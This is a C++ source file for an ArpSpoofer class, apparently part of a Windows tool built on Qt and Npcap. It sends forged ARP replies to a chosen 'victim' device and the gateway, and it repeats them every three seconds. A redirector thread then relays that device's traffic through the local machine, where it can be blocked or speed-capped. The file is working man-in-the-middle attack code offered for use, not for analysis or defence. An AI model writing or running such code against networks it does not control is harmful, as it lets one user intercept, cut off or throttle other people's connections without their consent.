#include "arpspoofer.h"

#include <QMutexLocker>
#include <QHostAddress>

#include <pcap.h>
#include <winsock2.h>
#include <iphlpapi.h>

// ── Ethernet / ARP constants ────────────────────────────────────
static constexpr int ETH_HEADER_LEN  = 14;
static constexpr int ARP_PACKET_LEN  = 42;
static constexpr int IP_HEADER_MIN   = 20;

static const QByteArray BROADCAST_MAC = QByteArray::fromHex("ffffffffffff");

// ── Construction / destruction ──────────────────────────────────

ArpSpoofer::ArpSpoofer(QObject *parent) : QObject(parent)
{
    m_spoofTimer = new QTimer(this);
    m_spoofTimer->setInterval(3000);
    connect(m_spoofTimer, &QTimer::timeout, this, &ArpSpoofer::spoofTimerTick);

    m_resetTimer = new QTimer(this);
    m_resetTimer->setInterval(1000);
    connect(m_resetTimer, &QTimer::timeout, this, &ArpSpoofer::resetCounters);
}

ArpSpoofer::~ArpSpoofer()
{
    stopAll();
    if (m_pcap) {
        pcap_close(m_pcap);
        m_pcap = nullptr;
    }
}

// ── Helpers: parse strings to byte arrays ───────────────────────

QByteArray ArpSpoofer::parseMac(const QString &mac)
{
    // Accept AA-BB-CC-DD-EE-FF or AA:BB:CC:DD:EE:FF
    QByteArray result;
    // Split on '-' or ':' without QRegularExpression
    QString normalized = mac;
    normalized.replace(QLatin1Char(':'), QLatin1Char('-'));
    const QStringList parts = normalized.split(QLatin1Char('-'));
    if (parts.size() != 6)
        return QByteArray(6, '\0');
    for (const QString &part : parts)
        result.append(static_cast<char>(part.toUInt(nullptr, 16)));
    return result;
}

QByteArray ArpSpoofer::parseIp(const QString &ip)
{
    const QHostAddress addr(ip);
    const quint32 ipv4 = addr.toIPv4Address();
    QByteArray result(4, '\0');
    result[0] = static_cast<char>((ipv4 >> 24) & 0xFF);
    result[1] = static_cast<char>((ipv4 >> 16) & 0xFF);
    result[2] = static_cast<char>((ipv4 >>  8) & 0xFF);
    result[3] = static_cast<char>((ipv4      ) & 0xFF);
    return result;
}

bool ArpSpoofer::macEquals(const unsigned char *a, const QByteArray &b)
{
    if (b.size() < 6) return false;
    return memcmp(a, b.constData(), 6) == 0;
}

bool ArpSpoofer::ipEquals(const unsigned char *a, const QByteArray &b)
{
    if (b.size() < 4) return false;
    return memcmp(a, b.constData(), 4) == 0;
}

// ── Initialize ──────────────────────────────────────────────────

bool ArpSpoofer::initialize(const QString &adapterName, const QString &localIp,
                            const QString &localMac, const QString &gatewayIp)
{
    m_adapterName = adapterName;
    m_localIp  = localIp;
    m_localMac = localMac;
    m_gatewayIp = gatewayIp;

    m_localMacBytes   = parseMac(localMac);
    m_localIpBytes    = parseIp(localIp);
    m_gatewayIpBytes  = parseIp(gatewayIp);

    // Find the pcap device name that corresponds to this adapter
    pcap_if_t *allDevs = nullptr;
    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_findalldevs(&allDevs, errbuf) < 0) {
        emit error(QStringLiteral("فشل في العثور على كروت الشبكة: %1").arg(QString::fromLocal8Bit(errbuf)));
        return false;
    }

    QString pcapDevName;
    for (pcap_if_t *d = allDevs; d; d = d->next) {
        const QString devName = QString::fromLocal8Bit(d->name);
        if (devName.contains(adapterName, Qt::CaseInsensitive)) {
            pcapDevName = devName;
            break;
        }
    }

    // If not found by adapter name, try matching by IP address
    if (pcapDevName.isEmpty()) {
        for (pcap_if_t *d = allDevs; d; d = d->next) {
            for (pcap_addr_t *a = d->addresses; a; a = a->next) {
                if (a->addr && a->addr->sa_family == AF_INET) {
                    auto *sin = reinterpret_cast<sockaddr_in*>(a->addr);
                    QString devIp = QString::fromLatin1(inet_ntoa(sin->sin_addr));
                    if (devIp == localIp) {
                        pcapDevName = QString::fromLocal8Bit(d->name);
                        break;
                    }
                }
            }
            if (!pcapDevName.isEmpty()) break;
        }
    }

    pcap_freealldevs(allDevs);

    if (pcapDevName.isEmpty()) {
        emit error(QStringLiteral("لم يتم العثور على كارت الشبكة المطلوب في Npcap."));
        return false;
    }

    // Open pcap handle
    m_pcap = pcap_open_live(pcapDevName.toLocal8Bit().constData(),
                            65536,     // snaplen
                            1,         // promiscuous mode
                            1,         // read timeout ms
                            errbuf);
    if (!m_pcap) {
        emit error(QStringLiteral("فشل في فتح كارت الشبكة: %1").arg(QString::fromLocal8Bit(errbuf)));
        return false;
    }

    // Resolve gateway MAC
    if (!resolveGatewayMac()) {
        emit error(QStringLiteral("فشل في الحصول على عنوان MAC للراوتر."));
        pcap_close(m_pcap);
        m_pcap = nullptr;
        return false;
    }

    m_running = true;
    emit initialized();
    return true;
}

bool ArpSpoofer::resolveGatewayMac()
{
    // Use Windows SendARP to get gateway MAC
    const QHostAddress gwAddr(m_gatewayIp);
    const IPAddr destIp = htonl(gwAddr.toIPv4Address());

    ULONG macBuffer[2] = {};
    ULONG macLen = 6;
    const DWORD result = SendARP(destIp, 0, macBuffer, &macLen);
    if (result != NO_ERROR || macLen == 0)
        return false;

    const auto *bytes = reinterpret_cast<const unsigned char *>(macBuffer);
    QStringList parts;
    for (ULONG i = 0; i < qMin<ULONG>(macLen, 6); ++i)
        parts.append(QStringLiteral("%1").arg(bytes[i], 2, 16, QLatin1Char('0')).toUpper());
    m_gatewayMac = parts.join(QLatin1Char('-'));
    m_gatewayMacBytes = parseMac(m_gatewayMac);
    return true;
}

// ── Build raw ARP packet (42 bytes) ─────────────────────────────

QByteArray ArpSpoofer::buildArpPacket(const QByteArray &srcMac, const QByteArray &dstMac,
                                       const QByteArray &senderMac, const QByteArray &senderIp,
                                       const QByteArray &targetMac, const QByteArray &targetIp,
                                       quint16 opcode)
{
    QByteArray packet(ARP_PACKET_LEN, '\0');
    char *pkt = packet.data();

    // Ethernet header
    memcpy(pkt + 0, dstMac.constData(), 6);     // Destination MAC
    memcpy(pkt + 6, srcMac.constData(), 6);      // Source MAC
    pkt[12] = 0x08; pkt[13] = 0x06;              // EtherType = ARP (0x0806)

    // ARP header
    pkt[14] = 0x00; pkt[15] = 0x01;              // Hardware type: Ethernet
    pkt[16] = 0x08; pkt[17] = 0x00;              // Protocol type: IPv4
    pkt[18] = 0x06;                               // Hardware size: 6
    pkt[19] = 0x04;                               // Protocol size: 4
    pkt[20] = static_cast<char>((opcode >> 8) & 0xFF);  // Operation
    pkt[21] = static_cast<char>(opcode & 0xFF);

    // ARP payload
    memcpy(pkt + 22, senderMac.constData(), 6);  // Sender MAC
    memcpy(pkt + 28, senderIp.constData(), 4);   // Sender IP
    memcpy(pkt + 32, targetMac.constData(), 6);  // Target MAC
    memcpy(pkt + 38, targetIp.constData(), 4);   // Target IP

    return packet;
}

// ── Spoof / Unspoof ─────────────────────────────────────────────

void ArpSpoofer::spoof(const QString &victimIp, const QByteArray &victimMac)
{
    if (!m_pcap) return;

    const QByteArray victimIpBytes = parseIp(victimIp);

    // 1. Tell victim: gateway's MAC is our MAC
    //    (victim will send all internet traffic to us)
    QByteArray pkt1 = buildArpPacket(
        m_localMacBytes,     // ETH src: us
        victimMac,           // ETH dst: victim
        m_localMacBytes,     // ARP sender MAC: us (the lie)
        m_gatewayIpBytes,    // ARP sender IP: gateway IP (the lie)
        victimMac,           // ARP target MAC: victim
        victimIpBytes,       // ARP target IP: victim
        2);                  // ARP Reply

    // 2. Tell gateway: victim's MAC is our MAC
    //    (gateway will send victim's traffic to us)
    QByteArray pkt2 = buildArpPacket(
        m_localMacBytes,     // ETH src: us
        m_gatewayMacBytes,   // ETH dst: gateway
        m_localMacBytes,     // ARP sender MAC: us (the lie)
        victimIpBytes,       // ARP sender IP: victim IP (the lie)
        m_gatewayMacBytes,   // ARP target MAC: gateway
        m_gatewayIpBytes,    // ARP target IP: gateway
        2);                  // ARP Reply

    // 3. Keep our own ARP table correct
    QByteArray pkt3 = buildArpPacket(
        m_localMacBytes, m_localMacBytes,
        m_gatewayMacBytes, m_gatewayIpBytes,
        m_localMacBytes, m_localIpBytes, 2);
    QByteArray pkt4 = buildArpPacket(
        m_localMacBytes, m_localMacBytes,
        victimMac, victimIpBytes,
        m_localMacBytes, m_localIpBytes, 2);

    pcap_sendpacket(m_pcap, reinterpret_cast<const u_char*>(pkt1.constData()), pkt1.size());
    pcap_sendpacket(m_pcap, reinterpret_cast<const u_char*>(pkt2.constData()), pkt2.size());
    pcap_sendpacket(m_pcap, reinterpret_cast<const u_char*>(pkt3.constData()), pkt3.size());
    pcap_sendpacket(m_pcap, reinterpret_cast<const u_char*>(pkt4.constData()), pkt4.size());
}

void ArpSpoofer::unspoof(const QString &victimIp, const QByteArray &victimMac)
{
    if (!m_pcap) return;

    const QByteArray victimIpBytes = parseIp(victimIp);

    // Restore victim's ARP: tell victim the real gateway MAC
    QByteArray pkt1 = buildArpPacket(
        m_gatewayMacBytes, victimMac,
        m_gatewayMacBytes, m_gatewayIpBytes,
        victimMac, victimIpBytes, 1);  // ARP Request (opcode 1)

    // Restore gateway's ARP: tell gateway the real victim MAC
    QByteArray pkt2 = buildArpPacket(
        victimMac, m_gatewayMacBytes,
        victimMac, victimIpBytes,
        m_gatewayMacBytes, m_gatewayIpBytes, 1);

    // Send multiple times to ensure restoration
    for (int i = 0; i < 5; ++i) {
        pcap_sendpacket(m_pcap, reinterpret_cast<const u_char*>(pkt1.constData()), pkt1.size());
        pcap_sendpacket(m_pcap, reinterpret_cast<const u_char*>(pkt2.constData()), pkt2.size());
    }
}

// ── Start / stop per-device spoofing ────────────────────────────

void ArpSpoofer::startSpoofing(const QString &deviceIp, const QString &deviceMac)
{
    if (!m_pcap) return;

    {
        QMutexLocker lock(&m_mutex);
        DeviceControl &dev = m_devices[deviceIp];
        dev.ip = deviceIp;
        dev.mac = deviceMac;
        dev.spoofEnabled = true;
    }

    // Immediately spoof
    spoof(deviceIp, parseMac(deviceMac));
    emit spoofStateChanged(deviceIp, true);

    // Ensure timers are running
    if (!m_spoofTimer->isActive())
        m_spoofTimer->start();
    if (!m_resetTimer->isActive())
        m_resetTimer->start();

    // Start redirector thread if not running
    if (!m_redirectorRunning) {
        m_redirectorRunning = true;
        m_redirectorThread = QThread::create([this]() { redirectorLoop(); });
        m_redirectorThread->start();
    }
}

void ArpSpoofer::stopSpoofing(const QString &deviceIp)
{
    QByteArray deviceMac;
    {
        QMutexLocker lock(&m_mutex);
        if (!m_devices.contains(deviceIp)) return;
        DeviceControl &dev = m_devices[deviceIp];
        dev.spoofEnabled = false;
        deviceMac = parseMac(dev.mac);
    }

    // Send unspoof packets multiple times
    for (int i = 0; i < 35; ++i)
        unspoof(deviceIp, deviceMac);

    {
        QMutexLocker lock(&m_mutex);
        m_devices.remove(deviceIp);
    }

    emit spoofStateChanged(deviceIp, false);

    // If no more devices, stop everything
    QMutexLocker lock(&m_mutex);
    if (m_devices.isEmpty()) {
        m_spoofTimer->stop();
        m_resetTimer->stop();
        m_redirectorRunning = false;
    }
}

void ArpSpoofer::stopAll()
{
    QMap<QString, DeviceControl> snapshot;
    {
        QMutexLocker lock(&m_mutex);
        snapshot = m_devices;
    }

    m_spoofTimer->stop();
    m_resetTimer->stop();
    m_redirectorRunning = false;

    // Wait for redirector thread to finish
    if (m_redirectorThread) {
        m_redirectorThread->wait(3000);
        delete m_redirectorThread;
        m_redirectorThread = nullptr;
    }

    // Unspoof all devices
    for (auto it = snapshot.begin(); it != snapshot.end(); ++it) {
        const QByteArray mac = parseMac(it.value().mac);
        for (int i = 0; i < 10; ++i)
            unspoof(it.key(), mac);
        emit spoofStateChanged(it.key(), false);
    }

    QMutexLocker lock(&m_mutex);
    m_devices.clear();
    m_running = false;
}

// ── Speed cap & block setters ───────────────────────────────────

void ArpSpoofer::setDownloadCap(const QString &ip, int kbps)
{
    QMutexLocker lock(&m_mutex);
    if (m_devices.contains(ip))
        m_devices[ip].downloadCapKBps = kbps;
}

void ArpSpoofer::setUploadCap(const QString &ip, int kbps)
{
    QMutexLocker lock(&m_mutex);
    if (m_devices.contains(ip))
        m_devices[ip].uploadCapKBps = kbps;
}

void ArpSpoofer::blockDevice(const QString &ip, bool block)
{
    QMutexLocker lock(&m_mutex);
    if (m_devices.contains(ip))
        m_devices[ip].blocked = block;
}

bool ArpSpoofer::isDeviceSpoofed(const QString &ip) const
{
    QMutexLocker lock(&m_mutex);
    return m_devices.contains(ip) && m_devices[ip].spoofEnabled;
}

DeviceControl ArpSpoofer::deviceInfo(const QString &ip) const
{
    QMutexLocker lock(&m_mutex);
    return m_devices.value(ip);
}

// ── Redirector loop (runs in separate thread) ───────────────────

void ArpSpoofer::redirectorLoop()
{
    if (!m_pcap) return;

    // Set pcap filter to "ip" (only IP packets, not ARP)
    struct bpf_program fp;
    if (pcap_compile(m_pcap, &fp, "ip", 1, PCAP_NETMASK_UNKNOWN) == 0) {
        pcap_setfilter(m_pcap, &fp);
        pcap_freecode(&fp);
    }

    struct pcap_pkthdr *header;
    const u_char *pktData;

    while (m_redirectorRunning) {
        const int res = pcap_next_ex(m_pcap, &header, &pktData);
        if (res <= 0) continue;
        if (header->caplen < ETH_HEADER_LEN + IP_HEADER_MIN) continue;

        const unsigned char *ethSrcMac  = pktData + 6;

        // Skip packets from ourselves
        if (macEquals(ethSrcMac, m_localMacBytes) &&
            ipEquals(pktData + ETH_HEADER_LEN + 12, m_localIpBytes))
            continue;

        // Packet from the gateway (download direction)
        if (macEquals(ethSrcMac, m_gatewayMacBytes)) {
            // Destination IP is in the IP header at offset 16 from IP start
            const unsigned char *dstIp = pktData + ETH_HEADER_LEN + 16;

            // Check if destination is our local IP (our own traffic)
            if (ipEquals(dstIp, m_localIpBytes))
                continue;

            // Find which victim this packet is for
            QMutexLocker lock(&m_mutex);
            for (auto it = m_devices.begin(); it != m_devices.end(); ++it) {
                const QByteArray victimIpBytes = parseIp(it.key());
                if (!ipEquals(dstIp, victimIpBytes)) continue;

                DeviceControl &dev = it.value();

                // If device is blocked, drop the packet (don't forward)
                if (dev.blocked) break;

                // Check download cap
                const qint64 capBytes = static_cast<qint64>(dev.downloadCapKBps) * 1024;
                if (capBytes > 0 && dev.bytesDownThisSecond >= capBytes)
                    break;  // Drop: exceeded cap

                // Forward the packet to the victim
                QByteArray fwd(reinterpret_cast<const char*>(pktData), static_cast<int>(header->caplen));
                const QByteArray victimMac = parseMac(dev.mac);
                memcpy(fwd.data() + 0, victimMac.constData(), 6);   // DST MAC = victim
                memcpy(fwd.data() + 6, m_localMacBytes.constData(), 6); // SRC MAC = us

                lock.unlock();
                pcap_sendpacket(m_pcap, reinterpret_cast<const u_char*>(fwd.constData()), fwd.size());
                lock.relock();

                dev.bytesDownThisSecond += header->caplen;
                dev.totalBytesDown += header->caplen;
                break;
            }
            continue;
        }

        // Packet from a victim (upload direction)
        {
            QMutexLocker lock(&m_mutex);
            for (auto it = m_devices.begin(); it != m_devices.end(); ++it) {
                const QByteArray victimMac = parseMac(it.value().mac);
                if (!macEquals(ethSrcMac, victimMac)) continue;

                DeviceControl &dev = it.value();

                if (dev.blocked) break;

                // Check upload cap
                const qint64 capBytes = static_cast<qint64>(dev.uploadCapKBps) * 1024;
                if (capBytes > 0 && dev.bytesUpThisSecond >= capBytes)
                    break;

                // Forward to the gateway
                QByteArray fwd(reinterpret_cast<const char*>(pktData), static_cast<int>(header->caplen));
                memcpy(fwd.data() + 0, m_gatewayMacBytes.constData(), 6); // DST MAC = gateway
                memcpy(fwd.data() + 6, m_localMacBytes.constData(), 6);   // SRC MAC = us

                lock.unlock();
                pcap_sendpacket(m_pcap, reinterpret_cast<const u_char*>(fwd.constData()), fwd.size());
                lock.relock();

                dev.bytesUpThisSecond += header->caplen;
                dev.totalBytesUp += header->caplen;
                break;
            }
        }
    }

    // Remove the filter when stopping
    struct bpf_program emptyFp;
    if (pcap_compile(m_pcap, &emptyFp, "", 1, PCAP_NETMASK_UNKNOWN) == 0) {
        pcap_setfilter(m_pcap, &emptyFp);
        pcap_freecode(&emptyFp);
    }
}

// ── Timer: re-poison ARP every 3 seconds ────────────────────────

void ArpSpoofer::spoofTimerTick()
{
    QMutexLocker lock(&m_mutex);
    for (auto it = m_devices.constBegin(); it != m_devices.constEnd(); ++it) {
        if (it.value().spoofEnabled) {
            const QByteArray mac = parseMac(it.value().mac);
            lock.unlock();
            spoof(it.key(), mac);
            lock.relock();
        }
    }
}

// ── Timer: reset byte counters every second, compute speed ──────

void ArpSpoofer::resetCounters()
{
    QMutexLocker lock(&m_mutex);
    for (auto it = m_devices.begin(); it != m_devices.end(); ++it) {
        DeviceControl &dev = it.value();
        dev.currentDownKBps = dev.bytesDownThisSecond / 1024;
        dev.currentUpKBps = dev.bytesUpThisSecond / 1024;
        dev.bytesDownThisSecond = 0;
        dev.bytesUpThisSecond = 0;

        const QString ip = it.key();
        const qint64 down = dev.currentDownKBps;
        const qint64 up = dev.currentUpKBps;
        lock.unlock();
        emit speedUpdate(ip, down, up);
        lock.relock();
    }
}
